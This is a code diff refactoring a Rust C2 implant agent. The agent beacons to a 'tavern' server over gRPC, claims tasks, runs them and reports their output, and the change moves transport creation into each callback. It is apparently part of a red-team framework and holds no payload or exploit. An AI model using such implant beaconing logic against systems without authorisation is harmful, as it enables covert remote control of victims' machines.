@@ -1,6 +1,6 @@
 use crate::{config::Config, task::TaskHandle};
 use anyhow::Result;
-use pb::c2::{Beacon, ClaimTasksRequest};
+use pb::c2::ClaimTasksRequest;
 use std::time::{Duration, Instant};
 use transport::{Transport, GRPC};
 
@@ -8,32 +8,27 @@ use transport::{Transport, GRPC};
  * Agent contains all relevant logic for managing callbacks to a c2 server.
  * It is responsible for obtaining tasks, executing them, and returning their output.
  */
-pub struct Agent<T: Transport> {
-    info: Beacon,
-    tavern: T,
+pub struct Agent {
+    cfg: Config,
     handles: Vec<TaskHandle>,
 }
 
-impl Agent<GRPC> {
+impl Agent {
     /*
      * Initialize an agent using the provided configuration.
      */
-    pub async fn gen_from_config(cfg: Config) -> Result<Agent<GRPC>> {
-        let tavern = GRPC::new(cfg.callback_uri).await?;
-
+    pub fn new(cfg: Config) -> Result<Self> {
         Ok(Agent {
-            info: cfg.info,
-            tavern,
+            cfg,
             handles: Vec::new(),
         })
     }
 
     // Claim tasks and start their execution
-    async fn claim_tasks(&mut self) -> Result<()> {
-        let tasks = self
-            .tavern
+    async fn claim_tasks(&mut self, mut tavern: GRPC) -> Result<()> {
+        let tasks = tavern
             .claim_tasks(ClaimTasksRequest {
-                beacon: Some(self.info.clone()),
+                beacon: Some(self.cfg.info.clone()),
             })
             .await?
             .tasks;
@@ -59,19 +54,19 @@ impl Agent<GRPC> {
     }
 
     // Report task output, remove completed tasks
-    async fn report(&mut self) -> Result<()> {
+    async fn report(&mut self, mut tavern: GRPC) -> Result<()> {
         // Report output from each handle
         let mut idx = 0;
         while idx < self.handles.len() {
             // Drop any handles that have completed
             if self.handles[idx].is_finished() {
                 let mut handle = self.handles.remove(idx);
-                handle.report(&mut self.tavern).await?;
+                handle.report(&mut tavern).await?;
                 continue;
             }
 
             // Otherwise report and increment
-            self.handles[idx].report(&mut self.tavern).await?;
+            self.handles[idx].report(&mut tavern).await?;
             idx += 1;
         }
 
@@ -82,8 +77,9 @@ impl Agent<GRPC> {
      * Callback once using the configured client to claim new tasks and report available output.
      */
     pub async fn callback(&mut self) -> Result<()> {
-        self.claim_tasks().await?;
-        self.report().await?;
+        let transport = GRPC::new(self.cfg.callback_uri.clone())?;
+        self.claim_tasks(transport.clone()).await?;
+        self.report(transport.clone()).await?;
 
         Ok(())
     }
@@ -91,7 +87,7 @@ impl Agent<GRPC> {
     /*
      * Callback indefinitely using the configured client to claim new tasks and report available output.
      */
-    pub async fn callback_loop(&mut self) {
+    pub async fn callback_loop(&mut self) -> Result<()> {
         loop {
             let start = Instant::now();
 
@@ -103,7 +99,7 @@ impl Agent<GRPC> {
                 }
             };
 
-            let interval = self.info.interval;
+            let interval = self.cfg.info.interval;
             let delay = match interval.checked_sub(start.elapsed().as_secs()) {
                 Some(secs) => Duration::from_secs(secs),
                 None => Duration::from_secs(0),
